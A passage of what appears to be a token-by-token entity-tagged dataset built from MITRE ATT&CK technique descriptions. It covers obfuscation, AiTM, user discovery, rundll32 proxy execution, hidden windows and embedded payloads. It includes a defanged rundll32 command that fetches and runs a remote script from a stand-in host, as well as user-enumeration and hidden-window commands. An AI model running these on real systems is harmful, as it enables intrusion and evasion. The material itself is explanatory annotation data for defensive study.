<code>hack</code>) O
found O
in O
message B-TARGET_ASSET
bodies I-TARGET_ASSET
and O
subject B-TARGET_ASSET
lines I-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Cloud O
App O
Security) O

In O
some O
environments O
, O
administrators O
may O
be O
able O
to O
enable O
email B-TARGET_ASSET
rules I-TARGET_ASSET
that O
operate B-PRECON
organization-wide I-PRECON
rather O
than O
on O
individual O
inboxes B-TARGET_ASSET
. O 

For O
example O
, O
Microsoft B-TARGET_ASSET
Exchange I-TARGET_ASSET
supports O
transport B-TARGET_ASSET
rules I-TARGET_ASSET
that O
evaluate O
all O
mail B-TARGET_ASSET
an O
organization O
receives O
against O
user-specified O
conditions O
, O
then O
performs O
a O
user-specified O
action O
on O
mail B-TARGET_ASSET
that O
adheres O
to O
those O
conditions O
. O 

(Citation: O
Microsoft O
Mail O
Flow O
Rules O
2023) O
Adversaries O
that O
abuse O
such O
features O
may O
be O
able O
to O
automatically O
modify O
or O
delete O
all O
emails B-TARGET_ASSET
related O
to O
specific O
topics O
(such O
as O
internal O
security O
incident O
notifications) O
. O 


An O
adversary O
may O
deface O
systems B-TARGET_ASSET
external B-PRECON
to I-PRECON
an I-PRECON
organization I-PRECON
in O
an O
attempt O
to O
deliver O
messaging O
, O
intimidate O
, O
or O
otherwise O
mislead O
an O
organization O
or O
users O
. O 

[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
ultimately O
cause O
users O
to O
distrust O
the O
systems B-TARGET_ASSET
and O
to O
question/discredit O
the O
system’s B-TARGET_ASSET
integrity I-TARGET_ASSET
. O 

Externally-facing B-PRECON
websites B-TARGET_ASSET
are O
a O
common O
victim O
of O
defacement O
; O
often O
targeted O
by O
adversary O
and O
hacktivist O
groups O
in O
order O
to O
push O
a O
political O
message O
or O
spread O
propaganda O
. O 

(Citation: O
FireEye O
Cyber O
Threats O
to O
Media O
Industries)(Citation: O
Kevin O
Mandia O
Statement O
to O
US O
Senate O
Committee O
on O
Intelligence)(Citation: O
Anonymous O
Hackers O
Deface O
Russian O
Govt O
Site) O
[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
be O
used O
as O
a O
catalyst O
to O
trigger O
events O
, O
or O
as O
a O
response O
to O
actions O
taken O
by O
an O
organization O
or O
government O
. O 

Similarly O
, O
website B-TARGET_ASSET
defacement I-TARGET_ASSET
may O
also O
be O
used O
as O
setup O
, O
or O
a O
precursor O
, O
for O
future O
attacks O
such O
as O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Deep O
Dive O
Into O
Defacement) O

Adversaries O
may O
encrypt O
or O
encode O
files B-TARGET_ASSET
to O
obfuscate O
strings O
, O
bytes O
, O
and O
other O
specific O
patterns O
to O
impede O
detection O
. O 

Encrypting O
and/or O
encoding O
file B-TARGET_ASSET
content I-TARGET_ASSET
aims O
to O
conceal O
malicious O
artifacts O
within O
a O
file B-TARGET_ASSET
used O
in O
an O
intrusion O
. O 

Many O
other O
techniques O
, O
such O
as O
[Software B-TARGET_ASSET
Packing](https://attack.mitre.org/techniques/T1027/002) I-TARGET_ASSET
, O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
and O
[Embedded B-TARGET_ASSET
Payloads](https://attack.mitre.org/techniques/T1027/009) I-TARGET_ASSET
, O
share O
this O
same O
broad O
objective O
. O 

Encrypting O
and/or O
encoding O
files B-TARGET_ASSET
could O
lead O
to O
a O
lapse O
in O
detection O
of O
static O
signatures O
, O
only O
for O
this O
malicious O
content O
to O
be O
revealed O
(i.e., O
[Deobfuscate/Decode O
Files O
or O
Information](https://attack.mitre.org/techniques/T1140)) O
at O
the O
time O
of O
execution/use O
. O 


This O
type O
of O
file O
obfuscation O
can O
be O
applied O
to O
many O
file B-TARGET_ASSET
artifacts I-TARGET_ASSET
present O
on O
victim O
hosts B-TARGET_ASSET
, O
such O
as O
malware B-TARGET_ASSET
log/configuration I-TARGET_ASSET
and O
payload B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
File O
obfuscation) O
Files B-TARGET_ASSET
can O
be O
encrypted B-PRECON
with I-PRECON
a I-PRECON
hardcoded I-PRECON
or I-PRECON
user-supplied I-PRECON
key I-PRECON
, O
as O
well O
as O
otherwise O
obfuscated O
using O
standard O
encoding O
schemes O
such O
as O
Base64 O
. O 


The O
entire O
content O
of O
a O
file B-TARGET_ASSET
may O
be O
obfuscated B-PRECON
, O
or O
just O
specific O
functions O
or O
values O
(such O
as O
C2 O
addresses) O
. O 

Encryption O
and O
encoding O
may O
also O
be O
applied O
in O
redundant O
layers O
for O
additional O
protection O
. O 


For O
example O
, O
adversaries O
may O
abuse O
password-protected B-PRECON
Word B-TARGET_ASSET
documents I-TARGET_ASSET
or O
self-extracting B-TARGET_ASSET
( I-TARGET_ASSET
SFX I-TARGET_ASSET
) I-TARGET_ASSET
archives I-TARGET_ASSET
as O
a O
method O
of O
encrypting/encoding O
a O
file B-TARGET_ASSET
such O
as O
a O
[Phishing](https://attack.mitre.org/techniques/T1566) O
payload B-TARGET_ASSET
. O 

These O
files B-TARGET_ASSET
typically O
function O
by O
attaching O
the O
intended O
archived O
content O
to O
a O
decompressor B-TARGET_ASSET
stub I-TARGET_ASSET
that O
is O
executed O
when O
the O
file B-TARGET_ASSET
is O
invoked O
(e.g., O
[User O
Execution](https://attack.mitre.org/techniques/T1204)) O
. O 

(Citation: O
SFX O
- O
Encrypted/Encoded O
File) O

Adversaries O
may O
also O
abuse O
file-specific O
as O
well O
as O
custom O
encoding O
schemes O
. O 

For O
example O
, O
Byte O
Order O
Mark O
(BOM) O
headers B-TARGET_ASSET
in O
text B-TARGET_ASSET
files I-TARGET_ASSET
may O
be O
abused O
to O
manipulate O
and O
obfuscate O
file B-TARGET_ASSET
content I-TARGET_ASSET
until O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
execution O
. O 


Adversaries O
may O
use O
scripts B-TARGET_ASSET
automatically B-PRECON
executed I-PRECON
at I-PRECON
boot I-PRECON
or I-PRECON
logon I-PRECON
initialization I-PRECON
to O
establish O
persistence O
. O 

(Citation: O
Mandiant O
APT29 O
Eye O
Spy O
Email O
Nov O
22)(Citation: O
Anomali O
Rocke O
March O
2019) O
Initialization B-TARGET_ASSET
scripts I-TARGET_ASSET
can O
be O
used O
to O
perform O
administrative O
functions O
, O
which O
may O
often O
execute O
other O
programs O
or O
send O
information O
to O
an O
internal O
logging B-TARGET_ASSET
server I-TARGET_ASSET
. O 

These O
scripts B-TARGET_ASSET
can O
vary O
based O
on O
operating B-TARGET_ASSET
system I-TARGET_ASSET
and O
whether O
applied O
locally O
or O
remotely O
. O 


Adversaries O
may O
use O
these O
scripts B-TARGET_ASSET
to O
maintain O
persistence O
on O
a O
single O
system B-TARGET_ASSET
. O 

Depending O
on O
the O
access O
configuration O
of O
the O
logon B-TARGET_ASSET
scripts I-TARGET_ASSET
, O
either O
local O
credentials B-TARGET_ASSET
or O
an O
administrator O
account O
may O
be O
necessary O
. O 


An O
adversary O
may O
also O
be O
able O
to O
escalate O
their O
privileges O
since O
some O
boot B-TARGET_ASSET
or O
logon B-TARGET_ASSET
initialization I-TARGET_ASSET
scripts I-TARGET_ASSET
run B-PRECON
with I-PRECON
higher I-PRECON
privileges I-PRECON
. O 


Adversaries O
may O
attempt O
to O
position O
themselves O
between O
two O
or O
more O
networked O
devices B-TARGET_ASSET
using O
an O
adversary-in-the-middle O
(AiTM) O
technique O
to O
support O
follow-on O
behaviors O
such O
as O
[Network O
Sniffing](https://attack.mitre.org/techniques/T1040) O
, O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
, O
or O
replay O
attacks O
([Exploitation O
for O
Credential O
Access](https://attack.mitre.org/techniques/T1212)) O
. O 

By O
abusing O
features O
of O
common O
networking B-TARGET_ASSET
protocols I-TARGET_ASSET
that O
can O
determine O
the O
flow O
of O
network O
traffic B-TARGET_ASSET
(e.g. O 

ARP B-TARGET_ASSET
, O
DNS B-TARGET_ASSET
, O
LLMNR B-TARGET_ASSET
, O
etc.) O
, O
adversaries O
may O
force O
a O
device B-TARGET_ASSET
to O
communicate O
through O
an O
adversary O
controlled O
system B-TARGET_ASSET
so O
they O
can O
collect O
information O
or O
perform O
additional O
actions O
. O 

(Citation: O
Rapid7 O
MiTM O
Basics) O

For O
example O
, O
adversaries O
may O
manipulate O
victim O
DNS B-TARGET_ASSET
settings I-TARGET_ASSET
to O
enable O
other O
malicious O
activities O
such O
as O
preventing/redirecting O
users O
from O
accessing O
legitimate O
sites O
and/or O
pushing O
additional O
malware O
. O 

(Citation: O
ttint_rat)(Citation: O
dns_changer_trojans)(Citation: O
ad_blocker_with_miner) O
Adversaries O
may O
also O
manipulate O
DNS B-TARGET_ASSET
and O
leverage O
their O
position O
in O
order O
to O
intercept O
user O
credentials B-TARGET_ASSET
, O
including O
access B-TARGET_ASSET
tokens I-TARGET_ASSET
([Steal O
Application O
Access O
Token](https://attack.mitre.org/techniques/T1528)) O
and O
session B-TARGET_ASSET
cookies I-TARGET_ASSET
([Steal O
Web O
Session O
Cookie](https://attack.mitre.org/techniques/T1539)) O
. O 

(Citation: O
volexity_0day_sophos_FW)(Citation: O
Token O
tactics) O
[Downgrade O
Attack](https://attack.mitre.org/techniques/T1562/010)s O
can O
also O
be O
used O
to O
establish O
an O
AiTM O
position O
, O
such O
as O
by O
negotiating O
a O
less B-PRECON
secure I-PRECON
, O
deprecated B-PRECON
, O
or O
weaker B-PRECON
version O
of O
communication B-TARGET_ASSET
protocol I-TARGET_ASSET
(SSL/TLS) O
or O
encryption B-TARGET_ASSET
algorithm I-TARGET_ASSET
. O 

(Citation: O
mitm_tls_downgrade_att)(Citation: O
taxonomy_downgrade_att_tls)(Citation: O
tlseminar_downgrade_att) O

Adversaries O
may O
also O
leverage O
the O
AiTM O
position O
to O
attempt O
to O
monitor O
and/or O
modify O
traffic B-TARGET_ASSET
, O
such O
as O
in O
[Transmitted O
Data O
Manipulation](https://attack.mitre.org/techniques/T1565/002) O
. O 

Adversaries O
can O
setup O
a O
position O
similar O
to O
AiTM O
to O
prevent O
traffic B-TARGET_ASSET
from O
flowing O
to O
the O
appropriate O
destination O
, O
potentially O
to O
[Impair O
Defenses](https://attack.mitre.org/techniques/T1562) O
and/or O
in O
support O
of O
a O
[Network O
Denial O
of O
Service](https://attack.mitre.org/techniques/T1498) O
. O 


Adversaries O
may O
attempt O
to O
identify O
the O
primary O
user O
, O
currently O
logged O
in O
user O
, O
set O
of O
users O
that O
commonly O
uses O
a O
system B-TARGET_ASSET
, O
or O
whether O
a O
user O
is O
actively O
using O
the O
system B-TARGET_ASSET
. O 

They O
may O
do O
this O
, O
for O
example O
, O
by O
retrieving O
account B-TARGET_ASSET
usernames I-TARGET_ASSET
or O
by O
using O
[OS B-TARGET_ASSET
Credential I-TARGET_ASSET
Dumping](https://attack.mitre.org/techniques/T1003) I-TARGET_ASSET
. O 

The O
information O
may O
be O
collected O
in O
a O
number O
of O
different O
ways O
using O
other O
Discovery O
techniques O
, O
because O
user O
and O
username O
details O
are O
prevalent O
throughout O
a O
system B-TARGET_ASSET
and O
include O
running O
process O
ownership O
, O
file/directory O
ownership O
, O
session O
information O
, O
and O
system B-TARGET_ASSET
logs I-TARGET_ASSET
. O 

Adversaries O
may O
use O
the O
information O
from O
[System O
Owner/User O
Discovery](https://attack.mitre.org/techniques/T1033) O
during O
automated O
discovery O
to O
shape O
follow-on O
behaviors O
, O
including O
whether O
or O
not O
the O
adversary O
fully O
infects O
the O
target O
and/or O
attempts O
specific O
actions O
. O 


Various O
utilities B-TARGET_ASSET
and O
commands O
may O
acquire O
this O
information O
, O
including O
<code>whoami</code> O
. O 

In O
macOS O
and O
Linux O
, O
the O
currently O
logged O
in O
user O
can O
be O
identified O
with O
<code>w</code> O
and O
<code>who</code> O
. O 

On O
macOS O
the O
<code>dscl O
. O 

list O
/Users O
| O
grep O
-v O
'_'</code> O
command O
can O
also O
be O
used O
to O
enumerate O
user O
accounts B-TARGET_ASSET
. O 

Environment B-TARGET_ASSET
variables I-TARGET_ASSET
, O
such O
as O
<code>%USERNAME%</code> O
and O
<code>$USER</code> O
, O
may O
also O
be O
used O
to O
access O
this O
information O
. O 


On O
network B-TARGET_ASSET
devices I-TARGET_ASSET
, O
[Network B-TARGET_ASSET
Device I-TARGET_ASSET
CLI](https://attack.mitre.org/techniques/T1059/008) I-TARGET_ASSET
commands O
such O
as O
`show O
users` O
and O
`show O
ssh` O
can O
be O
used O
to O
display O
users O
currently O
logged O
into O
the O
device B-TARGET_ASSET
. O 

(Citation: O
show_ssh_users_cmd_cisco)(Citation: O
US-CERT O
TA18-106A O
Network O
Infrastructure O
Devices O
2018) O

Adversaries O
may O
buy O
, O
lease O
, O
rent O
, O
or O
obtain O
infrastructure B-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

A O
wide O
variety O
of O
infrastructure B-TARGET_ASSET
exists O
for O
hosting O
and O
orchestrating O
adversary O
operations O
. O 

Infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
include O
physical O
or O
cloud O
servers B-TARGET_ASSET
, O
domains B-TARGET_ASSET
, O
and O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
TrendmicroHideoutsLease) O
Some O
infrastructure B-TARGET_ASSET
providers I-TARGET_ASSET
offer O
free B-PRECON
trial I-PRECON
periods I-PRECON
, O
enabling O
infrastructure B-TARGET_ASSET
acquisition O
at O
limited O
to O
no O
cost O
. O 

(Citation: O
Free O
Trial O
PurpleUrchin) O
Additionally O
, O
botnets B-TARGET_ASSET
are O
available O
for O
rent O
or O
purchase O
. O 


Use O
of O
these O
infrastructure B-TARGET_ASSET
solutions I-TARGET_ASSET
allows O
adversaries O
to O
stage O
, O
launch O
, O
and O
execute O
operations O
. O 

Solutions O
may O
help O
adversary O
operations O
blend O
in O
with O
traffic O
that O
is O
seen O
as O
normal O
, O
such O
as O
contacting O
third-party O
web B-TARGET_ASSET
services I-TARGET_ASSET
or O
acquiring O
infrastructure B-TARGET_ASSET
to O
support O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
, O
including O
from O
residential O
proxy B-TARGET_ASSET
services I-TARGET_ASSET
. O 

(Citation: O
amnesty_nso_pegasus)(Citation: O
FBI O
Proxies O
Credential O
Stuffing)(Citation: O
Mandiant O
APT29 O
Microsoft O
365 O
2022) O
Depending O
on O
the O
implementation O
, O
adversaries O
may O
use O
infrastructure B-TARGET_ASSET
that O
makes O
it O
difficult O
to O
physically O
tie O
back O
to O
them O
as O
well O
as O
utilize O
infrastructure B-TARGET_ASSET
that O
can O
be O
rapidly B-PRECON
provisioned I-PRECON
, O
modified B-PRECON
, O
and O
shut B-PRECON
down I-PRECON
. O 


Adversaries O
may O
abuse O
rundll32.exe B-TARGET_ASSET
to O
proxy O
execution O
of O
malicious O
code O
. O 

Using O
rundll32.exe B-TARGET_ASSET
, O
vice O
executing O
directly O
(i.e. O 

[Shared B-TARGET_ASSET
Modules](https://attack.mitre.org/techniques/T1129) I-TARGET_ASSET
) O
, O
may O
avoid O
triggering O
security B-TARGET_ASSET
tools I-TARGET_ASSET
that O
may O
not O
monitor O
execution O
of O
the O
rundll32.exe B-TARGET_ASSET
process I-TARGET_ASSET
because O
of O
allowlists O
or O
false O
positives O
from O
normal O
operations O
. O 

Rundll32.exe B-TARGET_ASSET
is O
commonly O
associated O
with O
executing O
DLL B-TARGET_ASSET
payloads I-TARGET_ASSET
(ex: O
<code>rundll32.exe O
{DLLname, O
DLLfunction}</code>) O
. O 


Rundll32.exe B-TARGET_ASSET
can O
also O
be O
used O
to O
execute O
[Control B-TARGET_ASSET
Panel](https://attack.mitre.org/techniques/T1218/002) I-TARGET_ASSET
Item I-TARGET_ASSET
files I-TARGET_ASSET
( I-TARGET_ASSET
.cpl I-TARGET_ASSET
) I-TARGET_ASSET
through O
the O
undocumented B-PRECON
shell32.dll B-TARGET_ASSET
functions I-TARGET_ASSET
<code>Control_RunDLL</code> O
and O
<code>Control_RunDLLAsUser</code> O
. O 

Double-clicking O
a O
.cpl B-TARGET_ASSET
file I-TARGET_ASSET
also O
causes O
rundll32.exe B-TARGET_ASSET
to O
execute O
. O 

(Citation: O
Trend O
Micro O
CPL) O
For O
example O
, O
[ClickOnce](https://attack.mitre.org/techniques/T1127/002) O
can O
be O
proxied O
through O
Rundll32.exe B-TARGET_ASSET
. O 


Rundll32 O
can O
also O
be O
used O
to O
execute O
scripts B-TARGET_ASSET
such O
as O
JavaScript B-TARGET_ASSET
. O 

This O
can O
be O
done O
using O
a O
syntax O
similar O
to O
this: O
<code>rundll32.exe O
javascript:""\..\mshtml,RunHTMLApplication O
"";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code> O
This O
behavior O
has O
been O
seen O
used O
by O
malware O
such O
as O
Poweliks O
. O 

(Citation: O
This O
is O
Security O
Command O
Line O
Confusion) O

Adversaries O
may O
also O
attempt O
to O
obscure O
malicious O
code O
from O
analysis O
by O
abusing O
the O
manner O
in O
which O
rundll32.exe B-TARGET_ASSET
loads O
DLL B-TARGET_ASSET
function I-TARGET_ASSET
names I-TARGET_ASSET
. O 

As O
part O
of O
Windows O
compatibility O
support O
for O
various O
character O
sets O
, O
rundll32.exe B-TARGET_ASSET
will O
first O
check O
for O
wide/Unicode O
then O
ANSI O
character-supported O
functions O
before O
loading O
the O
specified O
function O
(e.g., O
given O
the O
command O
<code>rundll32.exe O
ExampleDLL.dll, O
ExampleFunction</code> O
, O
rundll32.exe B-TARGET_ASSET
would O
first O
attempt O
to O
execute O
<code>ExampleFunctionW</code> O
, O
or O
failing O
that O
<code>ExampleFunctionA</code> O
, O
before O
loading O
<code>ExampleFunction</code>) O
. O 

Adversaries O
may O
therefore O
obscure O
malicious O
code O
by O
creating O
multiple O
identical O
exported O
function B-TARGET_ASSET
names I-TARGET_ASSET
and O
appending O
<code>W</code> O
and/or O
<code>A</code> O
to O
harmless O
ones O
. O 

(Citation: O
Attackify O
Rundll32.exe O
Obscurity)(Citation: O
Github O
NoRunDll) O
DLL B-TARGET_ASSET
functions I-TARGET_ASSET
can O
also O
be O
exported O
and O
executed O
by O
an O
ordinal O
number O
(ex: O
<code>rundll32.exe O
file.dll,#1</code>) O
. O 


Additionally O
, O
adversaries O
may O
use O
[Masquerading](https://attack.mitre.org/techniques/T1036) O
techniques O
(such O
as O
changing O
DLL O
file O
names O
, O
file O
extensions O
, O
or O
function O
names) O
to O
further O
conceal O
execution O
of O
a O
malicious O
payload O
. O 

(Citation: O
rundll32.exe O
defense O
evasion) O

Adversaries O
may O
attempt O
to O
discover O
containers B-TARGET_ASSET
and O
other O
resources O
that O
are O
available O
within O
a O
containers B-TARGET_ASSET
environment I-TARGET_ASSET
. O 

Other O
resources O
may O
include O
images B-TARGET_ASSET
, O
deployments B-TARGET_ASSET
, O
pods B-TARGET_ASSET
, O
nodes B-TARGET_ASSET
, O
and O
other O
information O
such O
as O
the O
status O
of O
a O
cluster B-TARGET_ASSET
. O 


These O
resources O
can O
be O
viewed O
within O
web B-TARGET_ASSET
applications I-TARGET_ASSET
such O
as O
the O
Kubernetes B-TARGET_ASSET
dashboard I-TARGET_ASSET
or O
can O
be O
queried O
via O
the O
Docker B-TARGET_ASSET
and O
Kubernetes B-TARGET_ASSET
APIs I-TARGET_ASSET
. O 

(Citation: O
Docker O
API)(Citation: O
Kubernetes O
API) O
In O
Docker O
, O
logs B-TARGET_ASSET
may O
leak O
information O
about O
the O
environment O
, O
such O
as O
the O
environment’s O
configuration O
, O
which O
services O
are O
available O
, O
and O
what O
cloud O
provider O
the O
victim O
may O
be O
utilizing O
. O 

The O
discovery O
of O
these O
resources O
may O
inform O
an O
adversary’s O
next O
steps O
in O
the O
environment O
, O
such O
as O
how O
to O
perform O
lateral O
movement O
and O
which O
methods O
to O
utilize O
for O
execution O
. O 


Adversaries O
may O
purchase O
and O
configure O
serverless B-TARGET_ASSET
cloud I-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
such O
as O
Cloudflare B-TARGET_ASSET
Workers I-TARGET_ASSET
, O
AWS B-TARGET_ASSET
Lambda I-TARGET_ASSET
functions I-TARGET_ASSET
, O
or O
Google B-TARGET_ASSET
Apps I-TARGET_ASSET
Scripts I-TARGET_ASSET
, O
that O
can O
be O
used O
during O
targeting O
. O 

By O
utilizing O
serverless B-TARGET_ASSET
infrastructure I-TARGET_ASSET
, O
adversaries O
can O
make O
it O
more O
difficult O
to O
attribute O
infrastructure B-TARGET_ASSET
used O
during O
operations O
back O
to O
them O
. O 


Once O
acquired B-PRECON
, O
the O
serverless B-TARGET_ASSET
runtime I-TARGET_ASSET
environment I-TARGET_ASSET
can O
be O
leveraged O
to O
either O
respond O
directly O
to O
infected O
machines O
or O
to O
[Proxy](https://attack.mitre.org/techniques/T1090) B-TARGET_ASSET
traffic I-TARGET_ASSET
to O
an O
adversary-owned O
command O
and O
control O
server B-TARGET_ASSET
. O 

(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers)(Citation: O
AWS O
Lambda O
Redirector)(Citation: O
GWS O
Apps O
Script O
Abuse O
2021) O
As O
traffic O
generated O
by O
these O
functions O
will O
appear O
to O
come O
from O
subdomains O
of O
common O
cloud O
providers O
, O
it O
may O
be O
difficult O
to O
distinguish O
from O
ordinary O
traffic O
to O
these O
providers O
- O
making O
it O
easier O
to O
[Hide O
Infrastructure](https://attack.mitre.org/techniques/T1665) O
. O 

(Citation: O
Detecting O
Command O
& O
Control O
in O
the O
Cloud)(Citation: O
BlackWater O
Malware O
Cloudflare O
Workers) O

Adversaries O
may O
implement O
hidden B-PRECON
windows B-TARGET_ASSET
to O
conceal O
malicious O
activity O
from O
the O
plain O
sight O
of O
users O
. O 

In O
some O
cases O
, O
windows B-TARGET_ASSET
that O
would O
typically O
be O
displayed O
when O
an O
application B-TARGET_ASSET
carries O
out O
an O
operation O
can O
be O
hidden B-PRECON
. O 

This O
may O
be O
utilized O
by O
system O
administrators O
to O
avoid O
disrupting O
user O
work O
environments O
when O
carrying O
out O
administrative O
tasks O
. O 

Adversaries O
may O
abuse O
operating B-TARGET_ASSET
system I-TARGET_ASSET
functionality O
to O
hide O
otherwise O
visible O
windows B-TARGET_ASSET
from O
users O
so O
as O
not O
to O
alert O
the O
user O
to O
adversary O
activity O
on O
the O
system B-TARGET_ASSET
. O 


### O
Windows O
There O
are O
a O
variety O
of O
features O
in O
scripting B-TARGET_ASSET
languages I-TARGET_ASSET
in O
Windows O
, O
such O
as O
[PowerShell](https://attack.mitre.org/techniques/T1086) B-TARGET_ASSET
, O
Jscript B-TARGET_ASSET
, O
and O
VBScript B-TARGET_ASSET
to O
make O
windows B-TARGET_ASSET
hidden B-PRECON
. O 

One O
example O
of O
this O
is O
<code>powershell.exe O
-WindowStyle O
Hidden</code> O
. O 

(Citation: O
PowerShell O
About O
2019) O

### O
Mac O
The O
configurations O
for O
how O
applications B-TARGET_ASSET
run O
on O
macOS O
are O
listed O
in O
property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
. O 

One O
of O
the O
tags O
in O
these O
files B-TARGET_ASSET
can O
be O
<code>apple.awt.UIElement</code> O
, O
which O
allows O
for O
Java O
applications B-TARGET_ASSET
to O
prevent O
the O
application's B-TARGET_ASSET
icon I-TARGET_ASSET
from O
appearing O
in O
the O
Dock B-TARGET_ASSET
. O 

A O
common O
use O
for O
this O
is O
when O
applications B-TARGET_ASSET
run O
in O
the O
system B-TARGET_ASSET
tray I-TARGET_ASSET
, O
but O
don't O
also O
want O
to O
show O
up O
in O
the O
Dock B-TARGET_ASSET
. O 

However O
, O
adversaries O
can O
abuse O
this O
feature O
and O
hide O
their O
running O
window B-TARGET_ASSET
. O 

(Citation: O
Antiquated O
Mac O
Malware) O

Mach-O B-TARGET_ASSET
binaries I-TARGET_ASSET
have O
a O
series O
of O
headers B-TARGET_ASSET
that O
are O
used O
to O
perform O
certain O
operations O
when O
a O
binary B-TARGET_ASSET
is O
loaded O
. O 

The O
LC_LOAD_DYLIB B-TARGET_ASSET
header I-TARGET_ASSET
in O
a O
Mach-O B-TARGET_ASSET
binary I-TARGET_ASSET
tells O
macOS O
and O
OS O
X O
which O
dynamic B-TARGET_ASSET
libraries I-TARGET_ASSET
( I-TARGET_ASSET
dylibs I-TARGET_ASSET
) O
to O
load O
during O
execution O
time O
. O 

These O
can O
be O
added O
ad-hoc O
to O
the O
compiled O
binary B-TARGET_ASSET
as O
long O
adjustments O
are O
made O
to O
the O
rest O
of O
the O
fields O
and O
dependencies O
(Citation: O
Writing O
Bad O
Malware O
for O
OSX) O
. O 

There O
are O
tools O
available O
to O
perform O
these O
changes O
. O 

Any O
changes O
will O
invalidate O
digital O
signatures O
on O
binaries B-TARGET_ASSET
because O
the O
binary B-TARGET_ASSET
is O
being O
modified B-PRECON
. O 

Adversaries O
can O
remediate O
this O
issue O
by O
simply O
removing O
the O
LC_CODE_SIGNATURE B-TARGET_ASSET
command I-TARGET_ASSET
from O
the O
binary B-TARGET_ASSET
so O
that O
the O
signature O
isn’t O
checked O
at O
load O
time O
(Citation: O
Malware O
Persistence O
on O
OS O
X) O
. O 


Adversaries O
may O
encode O
data B-TARGET_ASSET
with O
a O
standard O
data O
encoding O
system O
to O
make O
the O
content O
of O
command O
and O
control O
traffic B-TARGET_ASSET
more O
difficult O
to O
detect O
. O 

Command O
and O
control O
(C2) O
information B-TARGET_ASSET
can O
be O
encoded O
using O
a O
standard O
data O
encoding O
system O
that O
adheres O
to O
existing O
protocol B-TARGET_ASSET
specifications I-TARGET_ASSET
. O 

Common O
data O
encoding O
schemes O
include O
ASCII O
, O
Unicode O
, O
hexadecimal O
, O
Base64 O
, O
and O
MIME O
. O 

(Citation: O
Wikipedia O
Binary-to-text O
Encoding)(Citation: O
Wikipedia O
Character O
Encoding) O
Some O
data O
encoding O
systems O
may O
also O
result O
in O
data O
compression O
, O
such O
as O
gzip O
. O 


Adversaries O
may O
embed O
payloads B-TARGET_ASSET
within O
other O
files B-TARGET_ASSET
to O
conceal O
malicious O
content O
from O
defenses O
. O 

Otherwise O
seemingly O
benign O
files B-TARGET_ASSET
(such O
as O
scripts B-TARGET_ASSET
and O
executables B-TARGET_ASSET
) O
may O
be O
abused O
to O
carry O
and O
obfuscate O
malicious O
payloads B-TARGET_ASSET
and O
content O
. O 

In O
some O
cases O
, O
embedded B-PRECON
payloads B-TARGET_ASSET
may O
also O
enable O
adversaries O
to O
[Subvert O
Trust O
Controls](https://attack.mitre.org/techniques/T1553) O
by O
not O
impacting O
execution O
controls O
such O
as O
digital O
signatures O
and O
notarization O
tickets O
. O 

(Citation: O
Sentinel O
Labs) O

Adversaries O
may O
embed O
payloads B-TARGET_ASSET
in O
various O
file B-TARGET_ASSET
formats I-TARGET_ASSET
to O
hide O
payloads B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Learn) O
This O
is O
similar O
to O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
though O
does O
not O
involve O
weaving O
malicious O
content O
into O
specific O
bytes O
and O
patterns O
related O
to O
legitimate O
digital O
media O
formats O
. O 

(Citation: O
GitHub O
PSImage) O

For O
example O
, O
adversaries O
have O
been O
observed O
embedding O
payloads B-TARGET_ASSET
within O
or O
as O
an O
overlay O
of O
an O
otherwise O
benign O
binary B-TARGET_ASSET
. O 

(Citation: O
Securelist O
Dtrack2) O
Adversaries O
have O
also O
been O
observed O
nesting O
payloads B-TARGET_ASSET
(such O
as O
executables B-TARGET_ASSET
and O
run-only O
scripts B-TARGET_ASSET
) O
inside O
a O
file B-TARGET_ASSET
of O
the O
same O
format O
. O 

(Citation: O
SentinelLabs O
reversing O
run-only O
applescripts O
2021) O

Embedded B-PRECON
content B-TARGET_ASSET
may O
also O
be O
used O
as O
[Process O
Injection](https://attack.mitre.org/techniques/T1055) O
payloads B-TARGET_ASSET
used O
to O
infect O
benign O
system B-TARGET_ASSET
processes I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro) O
These O
embedded B-PRECON
then O
injected O
payloads B-TARGET_ASSET
may O
be O
used O
as O
part O
of O
the O
modules B-TARGET_ASSET
of O
malware B-TARGET_ASSET
designed O
to O
provide O
specific O
features O
such O
as O
encrypting O
C2 O
communications O
in O
support O
of O
an O
orchestrator O
module O
. O 

For O
example O
, O
an O
embedded B-TARGET_ASSET
module I-TARGET_ASSET
may O
be O
injected O
into O
default O
browsers B-TARGET_ASSET
, O
allowing O
adversaries O
to O
then O
communicate O
via O
the O
network B-TARGET_ASSET
. O 

(Citation: O
Malware O
Analysis O
Report O
ComRAT) O

Property B-TARGET_ASSET
list I-TARGET_ASSET
( I-TARGET_ASSET
plist I-TARGET_ASSET
) I-TARGET_ASSET
files I-TARGET_ASSET
contain O
all O
of O
the O
information O
that O
macOS O
and O
OS O
X O
uses O
to O
configure O
applications B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 

These O
files B-TARGET_ASSET
are O
UTF-8 B-PRECON
encoded I-PRECON
and O
formatted B-PRECON
like I-PRECON
XML I-PRECON
documents I-PRECON
via O
a O
series O
of O
keys O
surrounded O
by O
< O
> O
. O 

They O
detail O
when O
programs O
should O
execute O
, O
file O
paths O
to O
the O
executables O
, O
program O
arguments O
, O
required O
OS O
permissions O
, O
and O
many O
others O
. O 

plists B-TARGET_ASSET
are O
